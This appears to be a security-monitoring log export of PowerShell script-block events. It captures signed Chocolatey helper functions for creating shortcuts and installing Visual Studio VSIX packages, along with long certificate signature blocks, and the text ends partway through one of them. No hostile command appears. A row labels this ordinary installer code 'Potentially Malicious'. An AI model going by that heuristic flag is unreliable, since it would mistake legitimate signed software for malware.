http://powershell.com/cs/blogs/tips/archive/2009/02/05/validating-a-url.aspx function isURIWeb($address) { $uri = $address -as [System.URI] $uri.AbsoluteURI -ne $null -and $uri.Scheme -match '[http|https]' } if (!$shortcutFilePath) { # shortcut file path could be null if someone is trying to get special # paths for LocalSystem (SYSTEM). Write-Warning ""Unable to create shortcut. `$shortcutFilePath can not be null."" return } $shortcutDirectory = $([System.IO.Path]::GetDirectoryName($shortcutFilePath)) if (!(Test-Path($shortcutDirectory))) { [System.IO.Directory]::CreateDirectory($shortcutDirectory) | Out-Null } if (!$targetPath) { throw ""Install-ChocolateyShortcut - `$targetPath can not be null."" } if(!(Test-Path($targetPath)) -and !(IsURIWeb($targetPath))) { Write-Warning ""'$targetPath' does not exist. If it is not created the shortcut will not be valid."" } if($iconLocation) { if(!(Test-Path($iconLocation))) { Write-Warning ""'$iconLocation' does not exist. A default icon will be used."" } } if ($workingDirectory) { if ($workingDirectory -notmatch '%\w+%' -and !(Test-Path($workingDirectory))) { [System.IO.Directory]::CreateDirectory($workingDirectory) | Out-Null } } Write-Debug ""Creating Shortcut..."" try { $global:WshShell = New-Object -com ""WScript.Shell"" $lnk = $global:WshShell.CreateShortcut($shortcutFilePath) $lnk.TargetPath = $targetPath $lnk.WorkingDirectory = $workingDirectory $lnk.Arguments = $arguments if($iconLocation) { $lnk.IconLocation = $iconLocation } if ($description) { $lnk.Description = $description } if ($windowStyle) { $lnk.WindowStyle = $windowStyle } $lnk.Save() Write-Debug ""Shortcut created."" [System.IO.FileInfo]$Path = $shortcutFilePath If ($runAsAdmin) { #In order to enable the ""Run as Admin"" checkbox, this code reads the .LNK as a stream # and flips a specific bit while writing a new copy. It then replaces the original # .LNK with the copy, similar to this example: http://poshcode.org/2513 $TempFileName = [IO.Path]::GetRandomFileName() $TempFile = [IO.FileInfo][IO.Path]::Combine($Path.Directory, $TempFileName) $Writer = New-Object System.IO.FileStream $TempFile, ([System.IO.FileMode]::Create) $Reader = $Path.OpenRead() While ($Reader.Position -lt $Reader.Length) { $Byte = $Reader.ReadByte() If ($Reader.Position -eq 22) {$Byte = 34} $Writer.WriteByte($Byte) } $Reader.Close() $Writer.Close() $Path.Delete() Rename-Item -Path $TempFile -NewName $Path.Name | Out-Null } If ($pinToTaskbar) { $scfilename = $Path.FullName $pinverb = (new-object -com ""shell.application"").namespace($(split-path -parent $Path.FullName)).Parsename($(split-path -leaf $Path.FullName)).verbs() | ?{$_.Name -eq 'Pin to Tas&kbar'} If ($pinverb) {$pinverb.doit()} } } catch { Write-Warning ""Unable to create shortcut. Error captured was $($_.Exception.Message)."" } } # SIG # Begin signature block # MIIcpwYJKoZIhvcNAQcCoIIcmDCCHJQCAQExDzANBglghkgBZQMEAgEFADB5Bgor # BgEEAYI3AgEEoGswaTA0BgorBgEEAYI3AgEeMCYCAwEAAAQQH8w7YFlLCE63JNLG # KX7zUQIBAAIBAAIBAAIBAAIBADAxMA0GCWCGSAFlAwQCAQUABCCV4kKnyvkP8Q6w # z2NjPs2m5xO4ValwoIiDMeri2Kx1gKCCF7EwggUwMIIEGKADAgECAhAECRgbX9W7 # ZnVTQ7VvlVAIMA0GCSqGSIb3DQEBCwUAMGUxCzAJBgNVBAYTAlVTMRUwEwYDVQQK # EwxEaWdpQ2VydCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xJDAiBgNV # BAMTG0RpZ2lDZXJ0IEFzc3VyZWQgSUQgUm9vdCBDQTAeFw0xMzEwMjIxMjAwMDBa # Fw0yODEwMjIxMjAwMDBaMHIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2Vy # dCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xMTAvBgNVBAMTKERpZ2lD # ZXJ0IFNIQTIgQXNzdXJlZCBJRCBDb2RlIFNpZ25pbmcgQ0EwggEiMA0GCSqGSIb3 # DQEBAQUAA4IBDwAwggEKAoIBAQD407Mcfw4Rr2d3B9MLMUkZz9D7RZmxOttE9X/l # qJ3bMtdx6nadBS63j/qSQ8Cl+YnUNxnXtqrwnIal2CWsDnkoOn7p0WfTxvspJ8fT # eyOU5JEjlpB3gvmhhCNmElQzUHSxKCa7JGnCwlLyFGeKiUXULaGj6YgsIJWuHEqH # CN8M9eJNYBi+qsSyrnAxZjNxPqxwoqvOf+l8y5Kh5TsxHM/q8grkV7tKtel05iv+ # bMt+dDk2DZDv5LVOpKnqagqrhPOsZ061xPeM0SAlI+sIZD5SlsHyDxL0xY4PwaLo # LFH3c7y9hbFig3NBggfkOItqcyDQD2RzPJ6fpjOp/RnfJZPRAgMBAAGjggHNMIIB # yTASBgNVHRMBAf8ECDAGAQH/AgEAMA4GA1UdDwEB/wQEAwIBhjATBgNVHSUEDDAK # BggrBgEFBQcDAzB5BggrBgEFBQcBAQRtMGswJAYIKwYBBQUHMAGGGGh0dHA6Ly9v # Y3NwLmRpZ2ljZXJ0LmNvbTBDBggrBgEFBQcwAoY3aHR0cDovL2NhY2VydHMuZGln # aWNlcnQuY29tL0RpZ2lDZXJ0QXNzdXJlZElEUm9vdENBLmNydDCBgQYDVR0fBHow # eDA6oDigNoY0aHR0cDovL2NybDQuZGlnaWNlcnQuY29tL0RpZ2lDZXJ0QXNzdXJl # ZElEUm9vdENBLmNybDA6oDigNoY0aHR0cDovL2NybDMuZGlnaWNlcnQuY29tL0Rp # Z2lDZXJ0QXNzdXJlZElEUm9vdENBLmNybDBPBgNVHSAESDBGMDgGCmCGSAGG/WwA # AgQwKjAoBggrBgEFBQcCARYcaHR0cHM6Ly93d3cuZGlnaWNlcnQuY29tL0NQUzAK # BghghkgBhv1sAzAdBgNVHQ4EFgQUWsS5eyoKo6XqcQPAYPkt9mV1DlgwHwYDVR0j # BBgwFoAUReuir/SSy4IxLVGLp6chnfNtyA8wDQYJKoZIhvcNAQELBQADggEBAD7s # DVoks/Mi0RXILHwlKXaoHV0cLToaxO8wYdd+C2D9wz0PxK+L/e8q3yBVN7Dh9tGS # dQ9RtG6ljlriXiSBThCk7j9xjmMOE0ut119EefM2FAaK95xGTlz/kLEbBw6RFfu6 # r7VRwo0kriTGxycqoSkoGjpxKAI8LpGjwCUR4pwUR6F6aGivm6dcIFzZcbEMj7uo # +MUSaJ/PQMtARKUT8OZkDCUIQjKyNookAv4vcn4c10lFluhZHen6dGRrsutmQ9qz # sIzV6Q3d9gEgzpkxYz0IGhizgZtPxpMQBvwHgfqL2vmCSfdibqFT+hKUGIUukpHq # aGxEMrJmoecYpJpkUe8wggU6MIIEIqADAgECAhAH+0XZ9wtVKQNgl7T04UNwMA0G # CSqGSIb3DQEBCwUAMHIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2VydCBJ # bmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xMTAvBgNVBAMTKERpZ2lDZXJ0 # IFNIQTIgQXNzdXJlZCBJRCBDb2RlIFNpZ25pbmcgQ0EwHhcNMTgwMzMwMDAwMDAw # WhcNMjEwNDE0MTIwMDAwWjB3MQswCQYDVQQGEwJVUzEPMA0GA1UECBMGS2Fuc2Fz # MQ8wDQYDVQQHEwZUb3Bla2ExIjAgBgNVBAoTGUNob2NvbGF0ZXkgU29mdHdhcmUs # IEluYy4xIjAgBgNVBAMTGUNob2NvbGF0ZXkgU29mdHdhcmUsIEluYy4wggEiMA0G # CSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQC4irdLWVJryfKSgPPCyMN+nBmxtZIm # mTBhJMaYVJ6gtfvHcFakH7IC8TcjcEIrkK7wB/2vEJkEqiOTgbVQPZLnfX8ZAxhd # UiJmwQHEiSwLzoo2B35ROQ9qdOsn1bYIEzDpaqm/XwYH925LLpxhr9oCkBNf5dZs # e5bc/s1J5sQ9HRYwpb3MimmNHGpNP/YhjXX/kNFCZIv3mUadFHi+talYIN5dp6ai # /k+qgZeL5klPdmjyIgf3JiDywCf7j5nSbm3sWarYjM5vLe/oD+eK70fez30a17Cy # 97Jtqmdz6WUV1BcbMWeb9b8x369UJq5vt7vGwVFDOeGjwffuVHLRvWLnAgMBAAGj # ggHFMIIBwTAfBgNVHSMEGDAWgBRaxLl7KgqjpepxA8Bg+S32ZXUOWDAdBgNVHQ4E # FgQUqRlYCMLOvsDUS4mx9UA1avD3fvgwDgYDVR0PAQH/BAQDAgeAMBMGA1UdJQQM # MAoGCCsGAQUFBwMDMHcGA1UdHwRwMG4wNaAzoDGGL2h0dHA6Ly9jcmwzLmRpZ2lj # ZXJ0LmNvbS9zaGEyLWFzc3VyZWQtY3MtZzEuY3JsMDWgM6Axhi9odHRwOi8vY3Js # NC5kaWdpY2VydC5jb20vc2hhMi1hc3N1cmVkLWNzLWcxLmNybDBMBgNVHSAERTBD # MDcGCWCGSAGG/WwDATAqMCgGCCsGAQUFBwIBFhxodHRwczovL3d3dy5kaWdpY2Vy # dC5jb20vQ1BTMAgGBmeBDAEEATCBhAYIKwYBBQUHAQEEeDB2MCQGCCsGAQUFBzAB # hhhodHRwOi8vb2NzcC5kaWdpY2VydC5jb20wTgYIKwYBBQUHMAKGQmh0dHA6Ly9j # YWNlcnRzLmRpZ2ljZXJ0LmNvbS9EaWdpQ2VydFNIQTJBc3N1cmVkSURDb2RlU2ln # bmluZ0NBLmNydDAMBgNVHRMBAf8EAjAAMA0GCSqGSIb3DQEBCwUAA4IBAQA+ddcs # z/NB/+V+AIlUNOVTlGDNCtn1AfvwoRZg9XMmx0/S0EKayfVFTk/x96WMQgxL+/5x # B8Uhw6anlhbPC6bjBcIxRj/IUgR7yJ/NAykyM1x+pWvkPZV3slwe0GDPwhaqGUTU # aG8njO4EvA682a1o7wqQFR1MIltjtuPB2gp311LLxP1k5dpUMgaA0lAfnbRr+5dc # QOFWslkho1eBf0xlzSrhRGPy0e/IYWpl+/sEwXhD88QUkN7dSXY0fMlyGQfn6H4f # ozBQvCk37eoE0uAtkUrWAlJxO/4Esi83ko4hokwQJHaN64/7NdNaKlG3shC9+2QM # kY3j3BU+Ym2GZgtBMIIGajCCBVKgAwIBAgIQAwGaAjr/WLFr1tXq5hfwZjANBgkq # hkiG9w0BAQUFADBiMQswCQYDVQQGEwJVUzEVMBMGA1UEChMMRGlnaUNlcnQgSW5j # MRkwFwYDVQQLExB3d3cuZGlnaWNlcnQuY29tMSEwHwYDVQQDExhEaWdpQ2VydCBB # c3N1cmVkIElEIENBLTEwHhcNMTQxMDIyMDAwMDAwWhcNMjQxMDIyMDAwMDAwWjBH # MQswCQYDVQQGEwJVUzERMA8GA1UEChMIRGlnaUNlcnQxJTAjBgNVBAMTHERpZ2lD # ZXJ0IFRpbWVzdGFtcCBSZXNwb25kZXIwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAw # ggEKAoIBAQCjZF38fLPggjXg4PbGKuZJdTvMbuBTqZ8fZFnmfGt/a4ydVfiS457V # WmNbAklQ2YPOb2bu3cuF6V+l+dSHdIhEOxnJ5fWRn8YUOawk6qhLLJGJzF4o9GS2 # ULf1ErNzlgpno75hn67z/RJ4dQ6mWxT9RSOOhkRVfRiGBYxVh3lIRvfKDo2n3k5f # 4qi2LVkCYYhhchhoubh87ubnNC8xd4EwH7s2AY3vJ+P3mvBMMWSN4+v6GYeofs/s # jAw2W3rBerh4x8kGLkYQyI3oBGDbvHN0+k7Y/qpA8bLOcEaD6dpAoVk62RUJV5lW # MJPzyWHM0AjMa+xiQpGsAsDvpPCJEY93AgMBAAGjggM1MIIDMTAOBgNVHQ8BAf8E # BAMCB4AwDAYDVR0TAQH/BAIwADAWBgNVHSUBAf8EDDAKBggrBgEFBQcDCDCCAb8G # A1UdIASCAbYwggGyMIIBoQYJYIZIAYb9bAcBMIIBkjAoBggrBgEFBQcCARYcaHR0 # cHM6Ly93d3cuZGlnaWNlcnQuY29tL0NQUzCCAWQGCCsGAQUFBwICMIIBVh6CAVIA # QQBuAHkAIAB1AHMAZQAgAG8AZgAgAHQAaABpAHMAIABDAGUAcgB0AGkAZgBpAGMA # YQB0AGUAIABjAG8AbgBzAHQAaQB0AHUAdABlAHMAIABhAGMAYwBlAHAAdABhAG4A # YwBlACAAbwBmACAAdABoAGUAIABEAGkAZwBpAEMAZQByAHQAIABDAFAALwBDAFAA # UwAgAGEAbgBkACAAdABoAGUAIABSAGUAbAB5AGkAbgBnACAAUABhAHIAdAB5ACAA # QQBnAHIAZQBlAG0AZQBuAHQAIAB3AGgAaQBjAGgAIABsAGkAbQBpAHQAIABsAGkA # YQBiAGkAbABpAHQAeQAgAGEAbgBkACAAYQByAGUAIABpAG4AYwBvAHIAcABvAHIA # YQB0AGUAZAAgAGgAZQByAGUAaQBuACAAYgB5ACAAcgBlAGYAZQByAGUAbgBjAGUA # LjALBglghkgBhv1sAxUwHwYDVR0jBBgwFoAUFQASKxOYspkH7R7for5XDStnAs0w # HQYDVR0OBBYEFGFaTSS2STKdSip5GoNL9B6Jwcp9MH0GA1UdHwR2MHQwOKA2oDSG # Mmh0dHA6Ly9jcmwzLmRpZ2ljZXJ0LmNvbS9EaWdpQ2VydEFzc3VyZWRJRENBLTEu # Y3JsMDigNqA0hjJodHRwOi8vY3JsNC5kaWdpY2VydC5jb20vRGlnaUNlcnRBc3N1 # cmVkSURDQS0xLmNybDB3BggrBgEFBQcBAQRrMGkwJAYIKwYBBQUHMAGGGGh0dHA6 # Ly9vY3NwLmRpZ2ljZXJ0LmNvbTBBBggrBgEFBQcwAoY1aHR0cDovL2NhY2VydHMu # ZGlnaWNlcnQuY29tL0RpZ2lDZXJ0QXNzdXJlZElEQ0EtMS5jcnQwDQYJKoZIhvcN # AQEFBQADggEBAJ0lfhszTbImgVybhs4jIA+Ah+WI//+x1GosMe06FxlxF82pG7xa # FjkAneNshORaQPveBgGMN/qbsZ0kfv4gpFetW7easGAm6mlXIV00Lx9xsIOUGQVr # NZAQoHuXx/Y/5+IRQaa9YtnwJz04HShvOlIJ8OxwYtNiS7Dgc6aSwNOOMdgv420X # Ewbu5AO2FKvzj0OncZ0h3RTKFV2SQdr5D4HRmXQNJsQOfxu19aDxxncGKBXp2JPl # VRbwuwqrHNtcSCdmyKOLChzlldquxC5ZoGHd2vNtomHpigtt7BIYvfdVVEADkitr # wlHCCkivsNRu4PQUCjob4489yq9qjXvc2EQwggbNMIIFtaADAgECAhAG/fkDlgOt # 6gAK6z8nu7obMA0GCSqGSIb3DQEBBQUAMGUxCzAJBgNVBAYTAlVTMRUwEwYDVQQK # EwxEaWdpQ2VydCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xJDAiBgNV # BAMTG0RpZ2lDZXJ0IEFzc3VyZWQgSUQgUm9vdCBDQTAeFw0wNjExMTAwMDAwMDBa # Fw0yMTExMTAwMDAwMDBaMGIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2Vy # dCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xITAfBgNVBAMTGERpZ2lD # ZXJ0IEFzc3VyZWQgSUQgQ0EtMTCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoC # ggEBAOiCLZn5ysJClaWAc0Bw0p5WVFypxNJBBo/JM/xNRZFcgZ/tLJz4FlnfnrUk # FcKYubR3SdyJxArar8tea+2tsHEx6886QAxGTZPsi3o2CAOrDDT+GEmC/sfHMUiA # fB6iD5IOUMnGh+s2P9gww/+m9/uizW9zI/6sVgWQ8DIhFonGcIj5BZd9o8dD3QLo # Oz3tsUGj7T++25VIxO4es/K8DCuZ0MZdEkKB4YNugnM/JksUkK5ZZgrEjb7Szgau # rYRvSISbT0C58Uzyr5j79s5AXVz2qPEvr+yJIvJrGGWxwXOt1/HYzx4KdFxCuGh+ # t9V3CidWfA9ipD8yFGCV/QcEogkCAwEAAaOCA3owggN2MA4GA1UdDwEB/wQEAwIB # hjA7BgNVHSUENDAyBggrBgEFBQcDAQYIKwYBBQUHAwIGCCsGAQUFBwMDBggrBgEF # BQcDBAYIKwYBBQUHAwgwggHSBgNVHSAEggHJMIIBxTCCAbQGCmCGSAGG/WwAAQQw # ggGkMDoGCCsGAQUFBwIBFi5odHRwOi8vd3d3LmRpZ2ljZXJ0LmNvbS9zc2wtY3Bz # LXJlcG9zaXRvcnkuaHRtMIIBZAYIKwYBBQUHAgIwggFWHoIBUgBBAG4AeQAgAHUA # cwBlACAAbwBmACAAdABoAGkAcwAgAEMAZQByAHQAaQBmAGkAYwBhAHQAZQAgAGMA # bwBuAHMAdABpAHQAdQB0AGUAcwAgAGEAYwBjAGUAcAB0AGEAbgBjAGUAIABvAGYA # IAB0AGgAZQAgAEQAaQBnAGkAQwBlAHIAdAAgAEMAUAAvAEMAUABTACAAYQBuAGQA # IAB0AGgAZQAgAFIAZQBsAHkAaQBuAGcAIABQAGEAcgB0AHkAIABBAGcAcgBlAGUA # bQBlAG4AdAAgAHcAaABpAGMAaAAgAGwAaQBtAGkAdAAgAGwAaQBhAGIAaQBsAGkA # dAB5ACAAYQBuAGQAIABhAHIAZQAgAGkAbgBjAG8AcgBwAG8AcgBhAHQAZQBkACAA # aABlAHIAZQBpAG4AIABiAHkAIAByAGUAZgBlAHIAZQBuAGMAZQAuMAsGCWCGSAGG # /WwDFTASBgNVHRMBAf8ECDAGAQH/AgEAMHkGCCsGAQUFBwEBBG0wazAkBggrBgEF # BQcwAYYYaHR0cDovL29jc3AuZGlnaWNlcnQuY29tMEMGCCsGAQUFBzAChjdodHRw # Oi8vY2FjZXJ0cy5kaWdpY2VydC5jb20vRGlnaUNlcnRBc3N1cmVkSURSb290Q0Eu # Y3J0MIGBBgNVHR8EejB4MDqgOKA2hjRodHRwOi8vY3JsMy5kaWdpY2VydC5jb20v # RGlnaUNlcnRBc3N1cmVkSURSb290Q0EuY3JsMDqgOKA2hjRodHRwOi8vY3JsNC5k # aWdpY2VydC5jb20vRGlnaUNlcnRBc3N1cmVkSURSb290Q0EuY3JsMB0GA1UdDgQW # BBQVABIrE5iymQftHt+ivlcNK2cCzTAfBgNVHSMEGDAWgBRF66Kv9JLLgjEtUYun # pyGd823IDzANBgkqhkiG9w0BAQUFAAOCAQEARlA+ybcoJKc4HbZbKa9Sz1LpMUer # Vlx71Q0LQbPv7HUfdDjyslxhopyVw1Dkgrkj0bo6hnKtOHisdV0XFzRyR4WUVtHr # uzaEd8wkpfMEGVWp5+Pnq2LN+4stkMLA0rWUvV5PsQXSDj0aqRRbpoYxYqioM+Sb # OafE9c4deHaUJXPkKqvPnHZL7V/CSxbkS3BMAIke/MV5vEwSV/5f4R68Al2o/vsH # OE8Nxl2RuQ9nRc3Wg+3nkg2NsWmMT/tZ4CMP0qquAHzunEIOz5HXJ7cW7g/DvXwK # oO4sCFWFIrjrGBpN/CohrUkxg0eVd3HcsRtLSxwQnHcUwZ1PL1qVCCkQJjGCBEww # ggRIAgEBMIGGMHIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2VydCBJbmMx # GTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xMTAvBgNVBAMTKERpZ2lDZXJ0IFNI # QTIgQXNzdXJlZCBJRCBDb2RlIFNpZ25pbmcgQ0ECEAf7Rdn3C1UpA2CXtPThQ3Aw # DQYJYIZIAWUDBAIBBQCggYQwGAYKKwYBBAGCNwIBDDEKMAigAoAAoQKAADAZBgkq # hkiG9w0BCQMxDAYKKwYBBAGCNwIBBDAcBgorBgEEAYI3AgELMQ4wDAYKKwYBBAGC # NwIBFTAvBgkqhkiG9w0BCQQxIgQgM4dhQyywPrPo8jpeR3DNbT7H2WdznBS1+Bus # KT2bfQ0wDQYJKoZIhvcNAQEBBQAEggEAbWUKxJRm84/EF8/zeqa1zKe4AWpJ/gEi # QwtcOXs0Qnyft51e8c1xU2GOQZgAGvgSh7/PxsyVsFf5RMUF4KTVDTiF1PBanepr # vyJHjlmCWoa+NIncrLkelzSZLVmR91IGBpxxuL3E03d1rLOBK3MsTsv/n1l0nTzj # Th0bWNHNjcnJ89/jqS6j0E/x06GXwECdXPke/u6rpZ+ne5huAOlJgmce9bBL1v39 # SLEstdUW37fHTfvf8W4O3vdUYwXayuZOv+5ACQA5wVnwEL/jv+qxNFlM1ciPSuDH # DnFvlJp1vUavbyg9F+n4RYni9EUQTAw9F7Izk3Mt3mS6HCFwSwVWtaGCAg8wggIL # BgkqhkiG9w0BCQYxggH8MIIB+AIBATB2MGIxCzAJBgNVBAYTAlVTMRUwEwYDVQQK # EwxEaWdpQ2VydCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xITAfBgNV # BAMTGERpZ2lDZXJ0IEFzc3VyZWQgSUQgQ0EtMQIQAwGaAjr/WLFr1tXq5hfwZjAJ # BgUrDgMCGgUAoF0wGAYJKoZIhvcNAQkDMQsGCSqGSIb3DQEHATAcBgkqhkiG9w0B # CQUxDxcNMTkwMzE1MTc1NjU5WjAjBgkqhkiG9w0BCQQxFgQUAIvU+JA/yY/VMDda # AF5AyoutdvkwDQYJKoZIhvcNAQEBBQAEggEAAw12+/6F/pa2s2bjPlFgk4ZjQcRt # p/abG6OoDWEMorncdvyhrOe39oQxthDUOLm/FW8JvvlFNHxBwjCy4KUxPRTsmmBf # JKzuGv9Au1dfjGJAS+lPZyxTC5nyeKbCnG3Zwy77dAxvN2ZVd/vRhyw/itKoE3Lv # MSvUKhrRTFB1Sm7if/dh9r5YiBFCgKoTJJ9PCxIrGOx6R3Gbci+StDJXHBDOqgDh # HNoYd6Z6V6AKPy3mzU3yitDuMA2ugksV6OHroWUCUGfVkUCPHJZMceJVXzYTbCUS # wgDjjauYaSo+kzjicD27CjwNSeHZP0MSLFSoHfoU76lF2iplygQ1pdmkMw== # SIG # End signature block","73be1519-4648-4ed7-b305-605504afc242"
"2019-03-19 14:21:36.998 +01:00","Potentially Malicious PwSh","med","MSEDGEWIN10","PwSh",4104,75,"ScriptBlock: # Copyright © 2017 Chocolatey Software, Inc. # Copyright © 2015 - 2017 RealDimensions Software, LLC # Copyright © 2011 - 2015 RealDimensions Software, LLC & original authors/contributors from https://github.com/chocolatey/chocolatey # # Licensed under the Apache License, Version 2.0 (the ""License""); # you may not use this file except in compliance with the License. # You may obtain a copy of the License at # # http://www.apache.org/licenses/LICENSE-2.0 # # Unless required by applicable law or agreed to in writing, software # distributed under the License is distributed on an ""AS IS"" BASIS, # WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. # See the License for the specific language governing permissions and # limitations under the License. function Install-ChocolateyVsixPackage { <# .SYNOPSIS Downloads and installs a VSIX package for Visual Studio .DESCRIPTION VSIX packages are Extensions for the Visual Studio IDE. The Visual Studio Gallery at http://visualstudiogallery.msdn.microsoft.com/ is the public extension feed and hosts thousands of extensions. You can locate a VSIX Url by finding the download link of Visual Studio extensions on the Visual Studio Gallery. .NOTES Chocolatey works best when the packages contain the software it is managing and doesn't require downloads. However most software in the Windows world requires redistribution rights and when sharing packages publicly (like on the community feed), maintainers may not have those aforementioned rights. Chocolatey understands how to work with that, hence this function. You are not subject to this limitation with internal packages. .INPUTS None .OUTPUTS None .PARAMETER PackageName The name of the package - while this is an arbitrary value, it's recommended that it matches the package id. In 0.10.4+, `Name` is an alias for PackageName. .PARAMETER VsixUrl The URL of the package to be installed. Prefer HTTPS when available. Can be HTTP, FTP, or File URIs. In 0.10.4+, `Url` is an alias for VsixUrl. .PARAMETER VsVersion The major version number of Visual Studio where the package should be installed. This is optional. If not specified, the most recent Visual Studio installation will be targetted. NOTE: For Visual Studio 2015, the VsVersion is 14. It can be determined by looking at the folders under Program Files / Program Files (x86). In 0.10.4+, `VisualStudioVersion` is an alias for VsVersion. .PARAMETER Checksum The checksum hash value of the Url resource. This allows a checksum to be validated for files that are not local. The checksum type is covered by ChecksumType. **NOTE:** Checksums in packages are meant as a measure to validate the originally intended file that was used in the creation of a package is the same file that is received at a future date. Since this is used for other steps in the process related to the community repository, it ensures that the file a user receives is the same file a maintainer and a moderator (if applicable), plus any moderation review has intended for you to receive with this package. If you are looking at a remote source that uses the same url for updates, you will need to ensure the package also stays updated in line with those remote resource updates. You should look into [automatic packaging](https://chocolatey.org/docs/automatic-packages) to help provide that functionality. **NOTE:** To determine checksums, you can get that from the original site if provided. You can also use the [checksum tool available on the community feed](https://chocolatey.org/packages/checksum) (`choco install checksum`) and use it e.g. `checksum -t sha256 -f path\to\file`. Ensure you provide checksums for all remote resources used. .PARAMETER ChecksumType The type of checkum that the file is validated with - valid values are 'md5', 'sha1', 'sha256' or 'sha512' - defaults to 'md5'. MD5 is not recommended as certain organizations need to use FIPS compliant algorithms for hashing - see https://support.microsoft.com/en-us/kb/811833 for more details. The recommendation is to use at least SHA256. .PARAMETER Options OPTIONAL - Specify custom headers. Available in 0.9.10+. .PARAMETER File Will be used for VsixUrl if VsixUrl is empty. Available in 0.10.7+. This parameter provides compatibility, but should not be used directly and not with the community package repository until January 2018. .PARAMETER IgnoredArguments Allows splatting with arguments that do not apply. Do not use directly. .EXAMPLE > # This downloads the AutoWrockTestable VSIX from the Visual Studio # Gallery and installs it to the latest version of VS. Install-ChocolateyVsixPackage -PackageName ""MyPackage"" ` -VsixUrl http://visualstudiogallery.msdn.microsoft.com/ea3a37c9-1c76-4628-803e-b10a109e7943/file/73131/1/AutoWrockTestable.vsix .EXAMPLE > # This downloads the AutoWrockTestable VSIX from the Visual Studio # Gallery and installs it to Visual Studio 2012 (v11.0). Install-ChocolateyVsixPackage -PackageName ""MyPackage"" ` -VsixUrl http://visualstudiogallery.msdn.microsoft.com/ea3a37c9-1c76-4628-803e-b10a109e7943/file/73131/1/AutoWrockTestable.vsix ` -VsVersion 11 .LINK Install-ChocolateyPackage .LINK Install-ChocolateyInstallPackage .LINK Install-ChocolateyZipPackage #> param( [alias(""name"")][parameter(Mandatory=$true, Position=0)][string] $packageName, [alias(""url"")][parameter(Mandatory=$false, Position=1)][string] $vsixUrl, [alias(""visualStudioVersion"")][parameter(Mandatory=$false, Position=2)][int] $vsVersion = 0, [parameter(Mandatory=$false)][string] $checksum = '', [parameter(Mandatory=$false)][string] $checksumType = '', [parameter(Mandatory=$false)][hashtable] $options = @{Headers=@{}}, [alias(""fileFullPath"")][parameter(Mandatory=$false)][string] $file = '', [parameter(ValueFromRemainingArguments = $true)][Object[]] $ignoredArguments ) Write-FunctionCallLogMessage -Invocation $MyInvocation -Parameters $PSBoundParameters if ($vsixUrl -eq '' -or $vsixUrl -eq $null) { $vsixUrl = $file } if($vsVersion -eq 0) { if ([System.IntPtr]::Size -eq 4) { <# 32bits system case #> $versions=(get-ChildItem HKLM:SOFTWARE\Microsoft\VisualStudio -ErrorAction SilentlyContinue | ? { ($_.PSChildName -match ""^[0-9\.]+$"") } | ? {$_.property -contains ""InstallDir""} | sort {[int]($_.PSChildName)} -descending) } else { $versions=(get-ChildItem HKLM:SOFTWARE\Wow6432Node\Microsoft\VisualStudio -ErrorAction SilentlyContinue | ? { ($_.PSChildName -match ""^[0-9\.]+$"") } | ? {$_.property -contains ""InstallDir""} | sort {[int]($_.PSChildName)} -descending) } if($versions -and $versions.Length){ $version = $versions[0] }elseif($versions){ $version = $versions } } else { if ([System.IntPtr]::Size -eq 4) { <# 32bits system case #> $versions=(get-ChildItem HKLM:SOFTWARE\Microsoft\VisualStudio -ErrorAction SilentlyContinue | ? { ($_.PSChildName.EndsWith(""$vsVersion.0"")) } | ? {$_.property -contains ""InstallDir""}) } else { $version=(get-ChildItem HKLM:SOFTWARE\Wow6432Node\Microsoft\VisualStudio -ErrorAction SilentlyContinue | ? { ($_.PSChildName.EndsWith(""$vsVersion.0"")) } | ? {$_.property -contains ""InstallDir""}) } } if ($version) { $vnum=$version.PSPath.Substring($version.PSPath.LastIndexOf('\')+1) if($vnum -as [int] -lt 10) { throw ""This installed VS version, $vnum, does not support installing VSIX packages. Version 10 is the minimum acceptable version."" } $dir=(get-itemProperty $version.PSPath ""InstallDir"").InstallDir $installer = Join-Path $dir ""VsixInstaller.exe"" } if ($installer) { $download=""$env:TEMP\$($packageName.Replace(' ','')).vsix"" try{ Get-ChocolateyWebFile $packageName $download $vsixUrl -checksum $checksum -checksumType $checksumType -Options $options } catch { throw ""There were errors attempting to retrieve the vsix from $vsixUrl. The error message was '$_'."" } Write-Debug ""Installing VSIX using $installer"" $exitCode = Install-Vsix ""$installer"" ""$download"" if($exitCode -gt 0 -and $exitCode -ne 1001) { #1001: Already installed throw ""There was an error installing '$packageName'. The exit code returned was $exitCode."" } } else { throw ""Visual Studio is not installed or the specified version is not present."" } } # SIG # Begin signature block # MIIcpwYJKoZIhvcNAQcCoIIcmDCCHJQCAQExDzANBglghkgBZQMEAgEFADB5Bgor # BgEEAYI3AgEEoGswaTA0BgorBgEEAYI3AgEeMCYCAwEAAAQQH8w7YFlLCE63JNLG # KX7zUQIBAAIBAAIBAAIBAAIBADAxMA0GCWCGSAFlAwQCAQUABCAwvbwbcXwGHARv # s0aL6zHGEwZUxYCbjjh5ZcXDMGFCc6CCF7EwggUwMIIEGKADAgECAhAECRgbX9W7 # ZnVTQ7VvlVAIMA0GCSqGSIb3DQEBCwUAMGUxCzAJBgNVBAYTAlVTMRUwEwYDVQQK # EwxEaWdpQ2VydCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xJDAiBgNV # BAMTG0RpZ2lDZXJ0IEFzc3VyZWQgSUQgUm9vdCBDQTAeFw0xMzEwMjIxMjAwMDBa # Fw0yODEwMjIxMjAwMDBaMHIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2Vy # 